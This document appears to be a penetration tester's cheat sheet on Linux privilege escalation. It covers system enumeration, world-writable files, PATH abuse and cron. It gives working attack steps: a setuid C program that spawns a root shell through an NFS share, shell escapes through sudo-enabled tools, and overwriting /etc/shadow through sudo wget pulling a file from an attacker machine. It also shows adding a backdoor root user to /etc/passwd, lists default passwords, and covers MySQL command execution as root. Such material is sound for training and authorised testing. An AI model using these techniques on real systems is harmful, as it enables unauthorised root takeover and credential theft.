# Privilege Escalation: Linux

Even though Windows is heavily used for servers and desktops in most organizations, many other devices \(firewalls, routers, VOIP servers\) run Linux. Windows system administrators are often unfamiliar with Linux, which can make it the weakest link in a network.

After obtaining a reverse shell or low-privilege credentials, privilege escalation in Linux is typically achieved via kernel exploit or by taking advantage of misconfigurations.

## Gathering system information

### Kernel and architecture

Check system architecture to identify kernel exploits:

```text
uname -a
cat /proc/version
cat /etc/issue
hostname
```

Exploits can be discovered by using [Exploit-DB](https://www.exploit-db.com/) or searchsploit in Kali:

```text
searchsploit linux kernel 3.9
```

Use the filter to remove unwanted results, such as dos exploits:

```text
–exclude=”/dos/”
```

Don't use kernel exploits if you can avoid it. They can crash the machine, make it unstable or add a lot of data to `sys.log`.

### Users

Identify users on the system with the following commands:

```text
cat /etc/passwd
id
who
w
```

### Networking information

The following commands retrieve networking information such as the available network adapters and configuration, routes, active connections and other network related information.

Network adapters:

```text
ifconfig -a
```

Routes:

```text
route
```

Active connections:

```text
netstat -antup
```

ARP entries:

```text
arp -e
```

#### Services only available locally

You might discover that there is a service running that is that is only available from that host \(e.g. [VNC root remote desktop only accessible from localhost](https://knowledgelayer.softlayer.com/learning/tightvnc-server-ubuntu-1604)\). You can't connect to the service from the outside, only once you're inside. It might be a development server, a database, or anything else. These services might be running as root, or they may have vulnerabilities.

To find these services, check `netstat` and compare the results with the nmap scan from the outside to see if there are additional services available inside:

```text
netstat -anlp
netstat -ano
```

### Applications and services

Running services may have elevated privileges or known vulnerabilities that could be exploited.

Retrieve information about running applications and services:

```text
ps aux
```

Metasploit:

```text
ps
```

Filter for those running as root:

```text
ps aux | grep root
```

Debian and derivatives:

```text
dpkg -l
```

Fedora and derivatives:

```text
rpm -qa
```

OpenBSD, FreeBSD:

```text
pkg_info
```

Common locations for user installed software:

```text
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/
```

List configuration files in the `etc` directory:

```text
ls -ls /etc/ | grep .conf
```

### Files and filesystems

Find unmounted file systems:

```text
mount -l
cat /etc/fstab
```

#### Writable files and directories

If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges when the script is run as root. It might be part of a cronjob, or otherwise automated, or it might be run manually by a sysadmin. You can also check scripts that are called by these scripts.

World writable directories:

```text
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
```

World writable directories for root:

```text
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
```

World writable files:

```text
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
```

World writable files in `/etc/`:

```text
find /etc -perm -2 -type f 2>/dev/null
```

World writable directories:

```text
find / -writable -type d 2>/dev/null
```

#### Bad PATH configuration

Some sysadmins are lazy and would rather type `$script` instead of `$./script` to run something. They do this by adding `.` to their `PATH`.

If an attacker knows that a user has sudo privileges to change passwords \(including root\), they can place a fake program in a commonly-visited directory. For example, they might place a program called `ls` in a folder that changes the root password when the `ls` command is executed there.

Having `.` in your PATH can also help the attacker if exploiting programs that make system\(\), execvp\(\), or execlp\(\) calls to programs, if they do not specify the full path to the program the attacker can place a program into a directory in the PATH, so that program is run instead - this works because programmers just expect that the program they mean to run will be in the PATH.

To add `.` to your path:

```text
PATH=.:${PATH}
export PATH
```

#### NFS Share

If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.

Check if the target machine has any NFS shares:

```text
showmount -e [host]
```

If it does, then mount it to your filesystem:

```text
mount [host]:/ /tmp/
```

If that succeeds then you can go to `/tmp/share` and look for interesting files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says root has created the file, then you can create a file and set it with suid-permission from your attacking machine, then execute it with your low privilege shell.

This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the SUID-bit on it, like this:

```text
bash
chmod 4777 exploit
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

## Sudo

If the current user is part of the sudo group, they can execute commands as root without the root password, their user password, or none at all.

Display a list of commands that can be executed as super user:

```text
sudo -l
```

### Abusing sudo

If you have a limited shell that has access to some programs using `sudo` you might be able to escalate your privileges with any program that can write or overwrite files. For example, if you have sudo rights to `cp` you can overwrite `/etc/shadow` or `/etc/sudoers` with your own malicious file.

Similarly, if you have sudo rights to `wget` you can use it in combination with python's SimpleHTTPServer to overwrite `/etc/passwd` or `/etc/shadow` using the following commands:

```text
cd /etc/
python -m SimpleHTTPServer 8080
sudo wget http://[attack machine]:8080/evilshadowfile -O shadow
```

Using `less` you can go into vi, and then into a shell:

```text
sudo less /etc/shadow
v
:shell
```

Using `more` with a file that is bigger than your screen:

```text
sudo more /home/user/myfile
!/bin/bash
```

Using `find`:

```text
bash
sudo find / -exec bash -i \;
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
```

Perl:

```text
sudo perl
exec "/bin/bash";
ctr-d
```

Python:

```text
sudo python
import os
os.system("/bin/bash")
```

Using `tcpdump`:

```text
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Using `vi` or `vim`:

```text
sudo vi
:shell

:set shell=/bin/bash:shell    
:!bash
```

## SUID

SUID stands for set user ID and allows low-privileged users to execute the file as the **file owner**. This is especially useful when an application requires temporary root privileges to run effectively. Examples of such applications include `ping` and `nmap` which both need root permissions to open raw network sockets and create network packets. In general, this enhances security because you can grant root privileges to a single application isntead of a user account. However, SUID can be a serious security issue when that application is able to execute commands or edit files.

Command execution happens in the context of the service or the program that executes it. When the SUID is set as root then commands will be executed as root. The same applies to programs that are able to edit files, such as `vi`, `nano` and `leafpad`. Configuring these programs to execute as root would be a serious security vulnerability because any user could edit any file on the system.

Similarly, GUID means the program is run as the group, not the user who runs it.

Find SUID and GUID programs:

```text
find /* -user root -perm -4000 -print 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find / -perm -g=s -type f 2>/dev/null
```

### Abusing SUID nano

If nano \(or any other text editor\) has a SUID-bit, it can be used to edit `/etc/passwd` to change the root password.

Passwd is a text file containing user records and is located in the `/etc/` directory. For example, the entry for root looks like this:

```text
root:x:0:0:root:/root:/bin/bash
```

The fields from left to right contain:

1. Username
2. Password. The `x` means that the actual password is stored in `/etc/shadow/` but you can replace the x with a crypt hash from the password and a salt
3. User identifier
4. Group identifier, contains the primary user group
5. Gecos field, a user record containing information about the user such as the full name
6. Path to the home directory
7. Command line shell when the user logs in

To add a new root user to the file, we need to generate a crypt hash from the password. An easy way to do this is to use Perl or Python and print the results to the terminal:

```text
perl -e 'print crypt("YourPasswd", "salt"),"\n"'
```

Generate a crypt hash from password ‘cheese’ and salt ‘cheese’:

```text
perl -e 'print crypt("cheese", "cheese"),"\n"'
```

With this password hash, we can add the following line to the passwd file:

```text
cheese:poD7u2nSiBSLk:0:0:root:/root:/bin/bash
```

Save the file by pressing `ctrl+x` and hit Enter. Use the `su` command to switch to the newly created user:

```text
su cheese
```

Then enter the password: `cheese`

### Weak passwords

Passwords are often reused and found in plaintext configuration files, especially for web servers and databases. Sometimes the [default password](http://www.defaultpassword.com/) is used \(e.g. `tomcat/s3cret`\) or password files for other users are stored in the users `home` directory.

#### Configuration and password files

List configuration files in the etc directory:

```text
ls -ls /etc/ | grep .conf
```

Check home directory:

```text
ls -la /home/user
```

Check mail directory:

```text
ls -la /var/spool/mail
```

Script search for passwords:

```text
./LinEnum.sh -t -k password
```

Check web root:

```text
ls -la /var/www/html/
`
```

Web content management systems such as Joomla and WordPress contain configuration files called `configuration.php` and `wp-config.php` respectively. These configuration files include valuable information such as the MySQL username and password. Web administrators often re-use passwords for system accounts.

#### Common passwords

```text
username:username
username:username1
username:hostname
username:root
username:admin
username:qwerty
username:password, password123
admin:admin
test:test
```

## Cron

Cron jobs can be exploited by looking scheduled tasks owned by privileged user but editable by your user. For example, a world writable script set to run every hour as root could be edited by you to run malicious superuser commands.

```text
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

[Decipher and create cron schedules here](https://crontab.guru/).

## MySQL

If you're able to discover MySQL credentials \(e.g. from a WorPress configuration file\) and there is a remote administration service available \(usually port 3306\) you can connect to it and inspect databases and their contents.

### Enumerate users

[Metasploit](http://www.hackingarticles.in/penetration-testing-on-mysql-port-3306/):

```text
msf > use auxiliary/scanner/mysql/mysql_login
```

[Nmap](https://nmap.org/nsedoc/scripts/mysql-enum.html):

```text
nmap --script=mysql-enum [host]
```

### Inspect database

MySQL remote admin allows you to enumerate databases and potentially dump passwords.

Connect:

```text
mysql -u [user] -h [host] -p
Password:
```

Show databases and select one:

```text
show databases;
use [database name];
Show tables;
```

Dump database information:

```text
SELECT * FROM users
```

Finding and dumping password tables can provide you with plaintext passwords, hashes or salted hashes. Researching the database/application will tell you the format of a hashed password, which can then be cracked by **John** or **Hashcat**.

A more comprehensive list of commands can be found in this [cheat sheet](https://gist.github.com/hofmannsven/9164408).

### Running as root

If you find that mysql is running as root and you use your username and password to log in to the database you can issue the following commands:

```text
mysql
select sys_exec('whoami');
select sys_eval('whoami');
```

If neither of those work you can use a [User Defined Function](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)

## Capabilities

[Capabilities](https://www.insecure.ws/linux/getcap_setcap.html) are a little obscure but similar in principle to SUID. Linux’s thread/process privilege checking is based on capabilities: flags to the thread that indicate what kind of additional privileges they’re allowed to use. By default, root has all of them.

Examples:

| Capability | Description |
| :--- | :--- |
| CAP\_DAC\_OVERRIDE | Override read/write/execute permission checks \(full filesystem access\) |
| CAP\_DAC\_READ\_SEARCH | Only override reading files and opening/listing directories \(full filesystem READ access\) |
| CAP\_KILL | Can send any signal to any process \(such as sig kill\) |
| CAP\_SYS\_CHROOT | Ability to call chroot\(\) |

Capabilities are useful when you want to restrict your own processes after performing privileged operations \(e.g. after setting up chroot and binding to a socket\). However, they can be exploited by passing them malicious commands or arguments which are then run as root.

You can force capabilities upon programs using `setcap`, and query these using `getcap`:

```text
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

The `+ep` means you’re adding the capability \(“-” would remove it\) as Effective and Permitted.

To identify programs in a system or folder with capabilities:

```text
getcap -r /
getcap -r /etc
```

## Enumeration scripts

Enumeration scripts are an alternative to manual enumeration. However, they are 'dumb' and produce a lot of output, so obvious vulnerabilities can be missed. Manual enumeration is also useful for learning how a Linux system is set up and recognizing when something is amiss.

### LinEnum

[Linenum](https://github.com/rebootuser/LinEnum) is a shell script that checks for privilege escalation opportunities.

Options:

```text
-k Enter keyword
-e Enter export location
-t Include thorough (lengthy) tests
-r Enter report name
-h Displays this help text
```

### Unix-privesc-check

[Unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check) is a script for Unix machines, but will also work on Linux. Output can be saved in a file and grep'd for `Warning` items.

```text
./unix-privesc-check > output.txt
```

### Linprivchecker.py

[Linuxprivchecker](https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py) checks for vulnerabilities and also suggests kernel exploits, however many of them are unreliable or don't work on the architecture.

## References

* [http://www.rebootuser.com/?p=1758](http://www.rebootuser.com/?p=1758)
* [http://netsec.ws/?p=309](http://netsec.ws/?p=309)
* [https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/](https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/)
* [http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams](http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams)
* [http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections](http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections)
* [https://www.rebootuser.com/?page\_id=1721](https://www.rebootuser.com/?page_id=1721)
* [http://www.dankalia.com/tutor/01005/0100501004.htm](http://www.dankalia.com/tutor/01005/0100501004.htm)